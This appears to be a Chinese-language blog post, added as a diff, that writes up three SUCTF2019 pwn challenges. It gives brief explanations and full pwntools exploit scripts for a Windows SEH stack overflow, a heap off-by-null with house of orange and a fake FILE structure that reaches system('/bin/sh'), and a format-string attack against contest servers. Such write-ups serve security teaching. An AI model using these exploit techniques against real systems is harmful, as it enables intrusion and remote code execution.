@@ -1,0 +1,396 @@
+---
+layout: post
+title:  "2019.8.17 SUCTF2019 pwn write up"
+tags: [pwn, writeup]
+date: 2019-08-17
+comments: false
+---
+
+# SUCTF2019 pwn writeup
+
+
+
+## BabyStack
+
+非常类似的一个原题 HITB GSEC WIN PWN BABYSTACK： https://bbs.pediy.com/thread-221016.htm  
+
+看到入口函数的handler func为目标函数。  
+
+第一步使用div触发一个异常进入目标函数。这里可以控制esi。  
+
+![](https://hackmd.summershrimp.com/uploads/upload_6f9be14e79bd6a6c05b1033a1d0af69a.png)  
+
+接着按照例子的分析构造payload即可。与例子不同的是，此题的fake scope table貌似必须构造在SEH结构后面，构造在前面的话会被破坏？从而导致不会正常执行。
+
+exp
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年08月17日 星期六 18时17分57秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = remote('121.40.159.66',6666)
+
+context.log_level = 'debug'
+
+io.recvuntil("stack address = ")
+stackaddr = int(io.recv(8),16) -0xc8-4
+success('stackaddr:'+str(stackaddr+0x9c-12))
+
+
+io.sendlineafter("what did you know?\r\n",'0X212121')
+
+
+io.sendlineafter(" know more?\r\n",'yes')
+io.sendlineafter("want to know?\r\n",'2342916')
+io.recvuntil("s 0x23C004 value is ")
+cookie = int(io.recv(10),16)
+success('cookie:'+hex(cookie))
+#io.interactive()
+
+io.sendlineafter(" know more?\r\n",'yes')
+io.sendlineafter("want to know?\r\n",str(stackaddr+0x9c-12))
+io.recvuntil("value is ")
+gs = int(io.recv(10),16)
+success('gs:'+hex(gs))
+
+io.sendlineafter(" know more?\r\n",'yes')
+io.sendlineafter("want to know?\r\n",str(stackaddr+0x9c-8))
+io.recvuntil("value is ")
+data1 = int(io.recvuntil('\r\n'),16)
+success('data1:'+hex(data1))
+
+io.sendlineafter(" know more?\r\n",'yes')
+io.sendlineafter("want to know?\r\n",str(stackaddr+0x9c-4))
+io.recvuntil("value is ")
+data2 = int(io.recvuntil('\r\n'),16)
+success('data2:'+hex(data2))
+#exit()#0x1C8224
+
+io.sendlineafter(" know more?\r\n",'yes')
+io.sendlineafter("want to know?\r\n",str(stackaddr+0x9c))
+
+io.recvuntil("value is ")
+sehnext = int(io.recv(8),16)
+success('sehnext:'+hex(sehnext))
+
+filterfunc = 0x1c8224
+sehhandler = 0x1c9a30
+func = 0x1c8266#0x1c822a
+#scope = cookie ^ (stackaddr+4)
+#success('new scope:'+str(stackaddr+4))
+#testscope = cookie ^ 2337984
+#testscope2 = cookie ^ 2338016
+#success()
+#pay = "aaaa"+p32(0xffffffe4)+p32(0)+p32(0xFFFFFF0c)+p32(0)+p32(0xfffffffe) +p32(filterfunc)+ p32(func)+'\x00'*4+'a'*108+p32(gs)+p32(data1)+p32(data2)+p32(sehnext)+ p32(sehhandler) + p32(scope)
+
+
+scope2 = cookie ^ (stackaddr+0x9c+16)
+pay2="a"*144+p32(gs)+p32(data1)+p32(data2)+p32(sehnext)+ p32(sehhandler) + p32(scope2) + "\00"*4+p32(0xffffffe4)+p32(0)+p32(0xFFFFFF0c)+p32(0)+p32(0xfffffffe) +p32(filterfunc)+ p32(func)+'\x00'*4
+
+io.sendlineafter(" know more?\r\n",'noo')
+
+io.sendline(pay2)
+
+io.sendlineafter(" know more?\r\n",'yes')
+io.sendlineafter("want to know?\r\n",'le3d1ng')
+io.interactive()
+```
+
+
+## 二手破电脑
+
+1.可以通过commit功能产生0x90大小堆块释放后遗留的指针来泄露libc和heapbase.  
+
+2.add功能处添加name时有一个off-by-null.  
+
+3.house of orange 即可 : 构造overlap chunk ， 在中间布置一个unsorted bin chunk ， 重新生成大chunk覆盖之(这里overlap chunk大小要在0x200以内，且下一次malloc时的大小要刚刚好。不然中间构造的unsorted bin会被置入对应smallbin)。  
+
+
+exp
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年08月17日 星期六 14时08分00秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+import os
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+
+
+
+def change_ld(binary, ld):
+    """
+    Force to use assigned new ld.so by changing the binary
+    """
+    if not os.access(ld, os.R_OK): 
+        log.failure("Invalid path {} to ld".format(ld))
+        return None
+ 
+         
+    if not isinstance(binary, ELF):
+        if not os.access(binary, os.R_OK): 
+            log.failure("Invalid path {} to binary".format(binary))
+            return None
+        binary = ELF(binary)
+ 
+ 
+    for segment in binary.segments:
+        if segment.header['p_type'] == 'PT_INTERP':
+            size = segment.header['p_memsz']
+            addr = segment.header['p_paddr']
+            data = segment.data()
+            if size <= len(ld):
+                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
+                return None
+            binary.write(addr, ld.ljust(size, '\0'))
+            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
+            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
+            if os.access(path, os.F_OK): 
+                os.remove(path)
+                info("Removing exist file {}".format(path))
+            binary.save(path)    
+            os.chmod(path, 0b111000000) #rwx------
+    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
+    return ELF(path)
+#elf = change_ld('./pwn', './ld-2.23.so')
+#io = elf.process(env={'LD_PRELOAD':'./libc-2.23.so'})
+
+io = remote('47.111.59.243',10001)
+libc = ELF('./libc-2.23.so')
+
+
+#io = process('./pwn')
+#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+
+def pack_file32(_flags = 0,
+              _IO_read_ptr = 0,
+              _IO_read_end = 0,
+              _IO_read_base = 0,
+              _IO_write_base = 0,
+              _IO_write_ptr = 0,
+              _IO_write_end = 0,
+              _IO_buf_base = 0,
+              _IO_buf_end = 0,
+              _IO_save_base = 0,
+              _IO_backup_base = 0,
+              _IO_save_end = 0,
+              _IO_marker = 0,
+              _IO_chain = 0,
+              _fileno = 0,
+              _lock = 0,
+              _wide_data = 0,
+              _mode = 0):
+    file_struct = p32(_flags) + \
+            p32(_IO_read_ptr) + \
+            p32(_IO_read_end) + \
+            p32(_IO_read_base) + \
+            p32(_IO_write_base) + \
+            p32(_IO_write_ptr) + \
+            p32(_IO_write_end) + \
+            p32(_IO_buf_base) + \
+            p32(_IO_buf_end) + \
+            p32(_IO_save_base) + \
+            p32(_IO_backup_base) + \
+            p32(_IO_save_end) + \
+            p32(_IO_marker) + \
+            p32(_IO_chain) + \
+            p32(_fileno)
+    file_struct = file_struct.ljust(0x48, "\x00")
+    file_struct += p32(_lock)
+    file_struct = file_struct.ljust(0x58, "\x00")
+    file_struct += p32(_wide_data)
+    file_struct = file_struct.ljust(0x68, '\x00')
+    file_struct += p32(_mode)
+    file_struct = file_struct.ljust(0x94, "\x00")
+    return file_struct
+    
+    
+def finalonegadget32(libc,libcbase,binshaddr):
+    _IO_list_all_ptr = libc.symbols['_IO_list_all'] + libcbase
+    _IO_str_jumps_addr = libc.symbols['_IO_file_jumps'] + 0x60 + libcbase
+    binshaddr = binshaddr#libcbase + libc.search('/bin/sh').next() 
+    sysaddr = libcbase + libc.symbols['system']
+    payload = pack_file32(_flags = 0,
+                        _IO_read_ptr = 0x31,
+                        _IO_read_base = _IO_list_all_ptr-0x8,
+                        _IO_write_base = 2,
+                        _IO_write_ptr = 3,
+                        _IO_buf_base = binshaddr,
+                        _mode = 0,
+                        )
+    payload += p32(_IO_str_jumps_addr-0x4)
+    payload += p32(0) 
+    payload += p32(sysaddr)
+    return payload
+
+
+s = lambda a: io.send(str(a))
+sa = lambda a, b: io.sendafter(str(a), str(b))
+st = lambda a, b: io.sendthen(str(a), str(b))
+sl = lambda a: io.sendline(str(a))
+sla = lambda a, b: io.sendlineafter(str(a), str(b))
+slt = lambda a, b: io.sendlinethen(str(a), str(b))
+r = lambda a=4096: io.recv(a)
+rl = lambda: io.recvline()
+ru = lambda io: p.recvuntil(str(a))
+irt = lambda: io.interactive()
+def debug():
+    gdb.attach(io)
+    io.interactive()
+
+def add(l,c,p):
+    sla(">>> ",'1')
+    sla("Name length: ",l)
+    sla("Name: ",c)
+    sla("Price: ",p)
+
+def edit(idx,c,score):
+    sla(">>> ",'2')
+    sla("Index: ",idx)
+    sa(" : ",c)
+    sla("its score: ",score)
+
+def dele(idx):
+    sla(">>> ",'3')
+    sla("ISH PC? Give me your index: ",idx)
+
+def rename(idx,c,power='n',s=''):
+    sla(">>> ",'4')
+    sla("Index: ",idx)
+    sl(c)
+    sla("Wanna get more power?(y/n)",power)
+    if power == 'y':
+        sla("Give me serial:",s)
+
+
+add(0x60,'aaaa',0x60)
+add(0x60,'aaaa',0x60)
+add(0x60,'aaaa',0x60)
+edit(1,'aaaa',0x100)
+add(0x60,'aaaa',0x60)
+offset =0x1b07b0#0x1b27b0# 0x1b07b0
+
+dele(1)
+add(0x60,'aaaa',0x60)
+edit(1,'aaaa',0x100)
+#debug()
+dele(1)
+io.recvuntil('aaaa')
+libcbase = u32(io.recv(4)) - offset
+success('libcbase : '+hex(libcbase))
+
+add(0x60,'aaaa',0x60)
+
+edit(0,'aaaa',0)
+edit(1,'aaaa',1)
+edit(2,'aaaa',2)
+edit(3,'aaaa',3)
+
+
+dele(0)
+dele(1)
+
+add(0x60,'aaaa',0x60) #0
+edit(0,'aaaa',0)
+dele(0)
+offset2 = 0xc8
+io.recvuntil('aaaa')
+heapbase = u32(io.recv(4)) - offset2
+success('heapbase : '+hex(heapbase))
+
+dele(2)
+dele(3)
+
+
+add(0x10,'a',1)
+add(0x10,'a',1)
+add(0x10,'a',1)
+add(0x10,'a',1)
+add(0x10,'a',1)
+add(0x10,'a',1)
+add(0x10,'a',1)
+add(0x10,'a',1)
+
+for x in range(8):
+    dele(x)
+
+
+add(0xa0,'0',0)
+add(0x58,'1',1)
+add(0x8,'2',1)
+add(0x58,'3',1)
+add(0x8,'4',1)
+add(0x8,'5',1)
+add(0xf8,'6',1)
+add(0x68,'7',1)
+#debug()
+dele(1)
+dele(5)
+pay = "a"*0x8+p32(0xf0)
+add(0xc,pay,1)
+dele(6)
+dele(3)
+
+binshaddr = heapbase + 0x260
+pay2 = "/bin/sh\x00"+"a"*0x60+finalonegadget32(libc,libcbase,binshaddr) #cant have \x0a \x0b \x0c in input..And my local libc binshaddr's low 1 byte is "\x0b"...So use heap address to replace it.But remote libc seems good...
+
+sla(">>> ",'1')
+sla("Name length: ",488)
+sla("Name: ",pay2)
+sla("Price: ",1)
+
+sla(">>> ",'1')
+sla("Name length: ",233)
+
+io.interactive()
+```
+
+
+## playfmt  
+
+
+几乎跟HITCON Training LAB9一样。贴一下队伍里其他师傅的exp吧。  
+
+
+```python
+from pwn import *
+context.log_level = 'debug'
+
+p = remote("120.78.192.35", "9999")
+p.recvuntil("=\n")
+p.recvuntil("r\n")
+p.recvuntil("=\n")
+pause(2)
+payload = "%6$p"
+p.sendline(payload)
+stack1 = int(p.recvuntil('\n', drop=True), 16)
+print hex(stack1)
+num = (stack1 & 0xff)+0x10
+print hex(num)
+
+
+payload = '%{}c%6$hhn'.format(num)
+
+p.sendline(payload)
+p.recv()
+payload = '%16c%14$hhn'
+p.sendline(payload)
+p.recv()
+
+payload = "%18$s"
+p.sendline(payload)
+p.recv()
+```
